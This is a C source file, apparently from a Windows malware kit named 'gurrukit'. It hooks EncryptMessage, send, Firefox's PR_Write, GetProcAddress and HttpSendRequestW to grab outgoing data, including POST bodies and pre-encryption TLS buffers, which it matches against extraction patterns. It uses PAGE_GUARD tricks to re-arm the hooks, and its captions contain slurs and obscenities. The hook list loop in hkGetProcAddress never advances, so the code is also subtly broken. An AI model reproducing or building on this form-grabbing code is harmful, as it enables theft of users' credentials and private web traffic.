#include <windows.h>
#include <winternl.h>
#include <wininet.h>
#include "include/gurrukit.h"
#include "include/prio.h"
#include "include/regextract.h"
#include "include/hooking.h"
#include "include/hook.h"
 

extern HOOKS HooksList[];

/*
Hooking APIs
	- HttpSendRequestW		-> Capture information about POST request via WinHTTP library (ANSI version call Unicode API)
	- WSARecv/recv			-> Receive socket information
	- WSASend/send			-> Send socket information
	- CreateProcessExW		-> Create process (inject me now!).
	- PR_Write/PR_Read		-> Read/Write (Firefox)
	- PR_Poll				-> Poll Callback hook (Firefox)
*/

GURRUDLL LONG __stdcall hkEncryptMessage(PCtxtHandle phContext, ULONG fQOP, PSecBufferDesc pMessage, ULONG MessageSeqNo) {
	RegExtractStruct Extract;


	if (RegExtractA(&Extract, pMessage->pBuffers->pvBuffer) == TRUE) {
		orgMessageBoxA(NULL, pMessage->pBuffers->pvBuffer, "OK Negga!", 0);
	}

	return(orgEncryptMessage(phContext, fQOP, pMessage, MessageSeqNo));
}


GURRUDLL int hksend(SOCKET s, const char *buf, int len, int flag) {
	RegExtractStruct Extract;

	if (RegExtractA(&Extract, buf) == TRUE) {
		orgMessageBoxA(NULL, buf, "OK Negga!", 0);
	}

	return(orgsend(s, buf, len, flag));
}

GURRUDLL INT32 __cdecl hkPR_Write(HANDLE fd, PCHAR buf, INT32 amount) {
	RegExtractStruct Extract;
	DWORD dwOld;
	if (RegExtractA(&Extract, buf) == TRUE) {
		orgMessageBoxA(NULL, buf, "OK Negga!", 0);
	}
	

	orgPR_Write(fd, buf, amount);

	if (GetProcAddress(LoadLibraryA("nss3.dll"), "PR_Write")!=NULL)
		VirtualProtect(GetProcAddress(LoadLibraryA("nss3.dll"), "PR_Write"), 1, PAGE_EXECUTE | PAGE_GUARD, &dwOld);

	return 0;
	//VirtualProtect(GetProcAddress(LoadLibraryA("nss3.dll"), "PR_Write"), 1, PAGE_EXECUTE | PAGE_GUARD, &dwOld));
}


GURRUDLL FARPROC __stdcall hkGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
	int i = 0;

	while (HooksList[i].iDLLName != NULL) {
		if (lstrcmpiA(lpProcName, HooksList[i].iAPIName) == 0)
			return((FARPROC)HooksList[i].hkFunc);
	}

	return(orgGetProcAddress(hModule, lpProcName));
}


//Test purposes
DWORD __stdcall hkMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, DWORD dwOption) {
	RegExtractStruct Extract;
	DWORD dwOld;
	
	if (RegExtractA(&Extract, lpText) == TRUE) { // lpText = "Hello Kitty!" to modify call
		orgMessageBoxA(hWnd, "Owned", "Mother fuck", MB_ABORTRETRYIGNORE);
	}
	else {
		orgMessageBoxA(hWnd, lpText, lpCaption, dwOption);
	}
	return(VirtualProtect(GetProcAddress(LoadLibraryA("user32.dll"), "MessageBoxA"), 1, PAGE_EXECUTE | PAGE_GUARD, &dwOld));
}




GURRUDLL DWORD __stdcall hkHttpSendRequestW(HINTERNET hFile, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength) {
	wchar_t *str = lpOptional;
	if (str != NULL)
		MessageBoxW(GetForegroundWindow(), str, L"gurrukit", MB_OK);

	return(orgHttpSendRequestW(hFile, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength));
}
